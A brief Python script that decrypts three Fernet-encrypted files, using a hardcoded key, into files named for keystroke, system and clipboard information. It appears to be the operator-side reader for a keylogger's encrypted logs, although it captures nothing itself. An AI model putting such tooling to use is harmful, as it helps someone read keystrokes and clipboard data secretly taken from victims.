from cryptography.fernet import Fernet


keyInfoEncrypted = 'sys1.txt'
sysInfoEncrypted = 'sys2.txt'
clipboardInfoEncrypted = 'sys3.txt'

keyInfo = 'keyInfo.txt'
sysInfo = 'sysInfo.txt'
clipboardInfo = 'clipboardInfo.txt'
key = 'Blnqc9FN5l-aORHYCkm3bFih2jOOXr1if6b-z3J-Ohg='

filesToDecrypt = [keyInfoEncrypted, sysInfoEncrypted,clipboardInfoEncrypted]
decryptedFiles = [keyInfo, sysInfo, clipboardInfo]
count = 0

for encryptedFile in filesToDecrypt:
    with open(filesToDecrypt[count], 'rb') as f:
        data = f.read()
    fernet = Fernet(key)
    encryptedData = fernet.decrypt(data)

    with open(decryptedFiles[count], 'wb') as f:
        f.write(encryptedData)

    count += 1